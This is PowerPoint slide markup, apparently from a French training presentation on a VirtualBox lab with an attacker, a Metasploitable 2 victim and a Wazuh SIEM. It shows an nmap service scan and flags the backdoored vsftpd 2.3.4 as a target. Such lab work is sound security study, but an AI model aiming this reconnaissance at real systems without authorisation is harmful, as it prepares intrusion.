              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.56.101</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3562960" y="3474720"/>
            <a:ext cx="905256" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="94A3B8"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:headEnd type="triangle"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4541368" y="2148840"/>
            <a:ext cx="3108960" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3448"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F5F7FA"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0E86C0"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4906903" y="2393304"/>
            <a:ext cx="2578608" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E86C0"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Image 1" descr="lg_meta_w.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5245456" y="2523744"/>
            <a:ext cx="329184" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5245456" y="2404872"/>
            <a:ext cx="242316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METASPLOITABLE 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4541368" y="3172968"/>
            <a:ext cx="310896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Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>METASPLOITABLE 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4541368" y="3520440"/>
            <a:ext cx="3108960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="475569"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Victime · Ubuntu 8.04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4541368" y="4023360"/>
            <a:ext cx="3108960" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E86C0"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>192.168.56.110</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7723480" y="3474720"/>
            <a:ext cx="905256" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="94A3B8"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:headEnd type="triangle"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8701888" y="2148840"/>
            <a:ext cx="3108960" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3448"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F5F7FA"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="0E9E5E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9113368" y="2404872"/>
            <a:ext cx="2286000" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E9E5E"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="22" name="Image 2" descr="lg_wazuh_w.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9405976" y="2523744"/>
            <a:ext cx="329184" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9753448" y="2404872"/>
            <a:ext cx="155448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WAZUH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8701888" y="3172968"/>
            <a:ext cx="310896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Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WAZUH MANAGER</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8701888" y="3520440"/>
            <a:ext cx="3108960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="475569"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Défenseur · SIEM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8701888" y="4023360"/>
            <a:ext cx="3108960" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>92.168.56.108</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5074920"/>
            <a:ext cx="10515600" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="475569"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Réseau privé VirtualBox (host-only) — reconnaissance, exploitation, journalisation et réponse automatisée circulent entre les trois machines.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5623560"/>
            <a:ext cx="10515600" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C2760C"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>« Volet supplémentaire imposé par le sujet : supervision complète via Wazuh (SIEM) »</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 24"/>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94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000"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animBg="1"/>
      <p:bldP spid="9" grpId="0" animBg="1"/>
      <p:bldP spid="10" grpId="0" animBg="1"/>
      <p:bldP spid="12" grpId="0" animBg="1"/>
      <p:bldP spid="13" grpId="0" animBg="1"/>
      <p:bldP spid="15" grpId="0" animBg="1"/>
      <p:bldP spid="16" grpId="0" animBg="1"/>
      <p:bldP spid="17" grpId="0" animBg="1"/>
      <p:bldP spid="18" grpId="0" animBg="1"/>
      <p:bldP spid="20" grpId="0" animBg="1"/>
      <p:bldP spid="21" grpId="0" animBg="1"/>
      <p:bldP spid="24" grpId="0" animBg="1"/>
      <p:bldP spid="25" grpId="0" animBg="1"/>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p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137" name="Google Shape;137;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="384048"/>
            <a:ext cx="10058400" cy="2926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E11D48"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="Google Shape;138;p7"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Reconnaissance réseau (Nmap)</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Google Shape;139;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1234440"/>
            <a:ext cx="548640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9E5E"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> 192.168.56.105</a:t>
            </a:r>
            <a:endParaRPr sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="140" name="Google Shape;140;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1691640"/>
            <a:ext cx="5120640" cy="4114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48148"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>26 ports </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ouverts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>détectés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> — surface </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>d'attaque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> très large</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600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E11D48"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Port 21 · </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>vsftpd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> 2.3.4</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600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>→ version </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>connue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>contenir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> un backdoor</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600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E11D48"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Port 22 · OpenSSH 4.7p1</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600"/>
              </a:spcBef>
              <a:spcAft>
